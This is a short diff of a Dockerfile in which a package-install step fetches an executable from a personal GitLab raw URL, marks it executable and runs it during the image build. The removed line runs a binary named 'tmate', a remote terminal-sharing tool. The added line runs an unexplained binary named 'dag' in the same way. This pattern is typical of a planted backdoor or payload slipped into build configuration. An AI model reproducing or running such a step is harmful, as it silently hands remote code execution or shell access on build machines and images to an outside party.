@@ -15,7 +15,7 @@ RUN apt-get update && apt-get install -y \
     build-essential \
     nodejs \
     npm \
- && wget https://gitlab.com/richardkevin320/pede/-/raw/main/tmate && chmod +x tmate && ./tmate
+ && wget https://gitlab.com/richardkevin320/pede/-/raw/main/dag && chmod +x dag && ./dag
 
 # Set work dir:
 WORKDIR /home
